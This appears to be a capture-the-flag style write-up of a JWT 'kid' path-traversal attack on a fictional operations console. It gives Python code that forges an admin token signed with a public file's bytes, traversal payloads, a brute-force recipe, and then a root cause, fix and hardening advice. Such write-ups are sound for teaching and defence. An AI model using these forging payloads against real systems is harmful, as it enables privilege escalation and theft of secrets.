# Vardanne Command Console — JWT `kid` Path Traversal to Admin

## Summary

The Vardanne Command operations console issues HS256-signed JWTs to authenticated analysts. The signature verification routine loads the HMAC secret from a file whose path is derived from the untrusted `kid` (key ID) header, without sanitising the value. By pointing `kid` at a publicly downloadable brand asset via path traversal, an attacker can forge a token that the server will happily verify — because the "secret" is a file the attacker can read. Combined with a `role` claim the admin route trusts, this yields the custody recovery key.

- **Target:** Vardanne Command operations console
- **Vulnerability:** JWT `kid` path traversal → HMAC key confusion
- **Impact:** Vertical privilege escalation (analyst → admin), disclosure of the recovery key
- **Final route:** `GET /admin/recovery-key`

---

## Reconnaissance

### Session token

`GET /token` issues an analyst session:

```json
header:  {"alg": "HS256", "typ": "JWT", "kid": "session"}
payload: {"sub": "analyst-recon-17", "role": "analyst"}
```

Two things stand out:

1. **`alg: HS256`** — symmetric signing. The verifier must possess the same secret to check the signature, which means the secret lives on the server filesystem.
2. **`kid: "session"`** — the header carries a key identifier. The server uses this to decide *which* key to load.

### Schema

`GET /schema` is self-describing and confirms the mechanism:

```json
{
  "auth": {
    "scheme": "Bearer JWT (HS256)",
    "verify": "the console loads each token's signing key by its `kid` (key id) header"
  },
  "routes": {
    "GET /public/{name}": "public brand assets",
    "GET /admin/recovery-key": "admin-only: returns the custody recovery key"
  }
}
```

Two corrections to the obvious first attempt:

- The privileged route is **`/admin/recovery-key`**, not `/admin/flag`.
- The route requires **the issued analyst subject** *and* `role=admin` — meaning `sub` must stay as issued. Only `role` needs to change.

### Public assets

`/public/` is not directory-listable (404), but probing common brand-asset names found three real files:

```
/public/brand.txt
/public/assets/brand.txt
/public/brand/brand.txt
```

These are the known-plaintext files that will become the HMAC key.

---

## Exploit

### Core idea

The verifier almost certainly does something like:

```python
key = open(f"keys/{header['kid']}", "rb").read()
jwt.decode(token, key, algorithms=["HS256"])
```

Because `kid` is attacker-controlled and joined into a path, `../` sequences escape `keys/`. If the resolved path lands on a file the attacker can also download, the attacker knows the exact HMAC secret and can produce a valid signature.

### Forged payload

Keep the issued subject, change the role:

```json
{"sub": "analyst-recon-17", "role": "admin"}
```

Changing `sub` to `"admin"` would fail the subject check even with a valid signature.

### Forged `kid`

Point `kid` at the public file through traversal. From a `keys/` directory, a payload like:

```
"kid": "../../public/brand.txt"
```

resolves to `public/brand.txt` — a file the attacker already has byte-for-byte. Its exact contents become the HS256 secret.

### Signing and replay

Because the public file is fully downloadable, the attacker can compute the HMAC locally:

```python
secret = requests.get(f"{BASE}/public/brand.txt").content

forged = jwt.encode(
    {"sub": "analyst-recon-17", "role": "admin"},
    secret,
    algorithm="HS256",
    headers={"kid": "../../public/brand.txt"},
)
```

Then replay it to the privileged route:

```http
GET /admin/recovery-key
Authorization: Bearer <forged>
```

The server loads `keys/../../public/brand.txt`, reads the same bytes the attacker downloaded, verifies the signature successfully, sees `role=admin` with a valid `sub`, and returns the recovery key.

### Brute-force fallback

The exact traversal depth and key-directory prefix depend on deployment (`keys/`, `./keys/`, `/app/keys/`, `/srv/keys/`, …). A short brute-force over:

- traversal depth (`../`, `../../`, …)
- key-directory prefix (`""`, `keys/`, `./keys/`, `/app/keys/`, …)
- the three real assets

against `/admin/recovery-key` reliably lands. A `401/403` means the path missed; an **`HTTP 500`** is a strong near-miss — the server resolved the file but failed to use it, typically indicating an extension the server appends (e.g. `kid + ".pem"`).

---

## Root cause

Untrusted data from a JWT header (`kid`) is used directly to build a filesystem path:

```python
key_path = f"keys/{header['kid']}"
key = open(key_path, "rb").read()
```

The verifier trusts the *name* of the key in the token it is trying to verify, which is a classic **HMAC key confusion / `kid` injection**. The attacker is not breaking HS256 — they are choosing the secret.

Because the chosen secret is a publicly hosted file, the attacker and the verifier compute the same HMAC and the signature check passes by construction.

---

## Fix

Never build a filesystem path from `kid`. Map `kid` through a fixed, server-side allowlist:

```python
KEYS = {
    "session": load_key("session.pem"),
    # ...
}

kid = header.get("kid")
if kid not in KEYS:
    raise InvalidTokenError("unknown kid")
key = KEYS[kid]
```

If keys must be loaded dynamically, enforce:

- Rejection of any `kid` containing `..`, `/`, `\`, NUL, or an absolute path.
- Resolution against a canonical base directory followed by a real-path containment check.
- Prefer opaque, server-generated key IDs over client-supplied paths.

Additional hardening:

- Do not accept `alg` from the token header; pin the expected algorithm server-side.
- Rotate the signing key and the custody recovery key once this vulnerability was reachable, since the key material was guessable to any client.
- Treat `role` as a server-side lookup keyed on `sub`, not a claim carried in the token.

---

## Timeline

| Step | Action |
| --- | --- |
| 1 | `GET /token` — obtain analyst JWT, decode header → `kid: "session"` |
| 2 | `GET /schema` — confirm `kid`-driven key loading, admin route `/admin/recovery-key`, subject+role requirement |
| 3 | Enumerate `/public/{name}` — discover `/public/brand.txt` and variants |
| 4 | Forge payload `{sub: analyst-recon-17, role: admin}` |
| 5 | Point `kid` at `../…/public/brand.txt`, sign with the file's exact bytes |
| 6 | `GET /admin/recovery-key` — recover custody key |

---

## Lessons

- **Self-describing schemas help attackers as much as developers.** `/schema` documented the exact trust relationship between `kid` and key loading.
- **"Public" assets are not just cosmetic.** Any file an unauthenticated client can read is a candidate HMAC secret if the verifier can be steered toward it.
- **`kid` is a name, not a path.** Treating a token header as a filesystem hint is the vulnerability, independent of algorithm strength.
- **Keep `sub` honest.** The forged token worked because the attacker preserved the subject the server expected and changed only the claim the server trusted.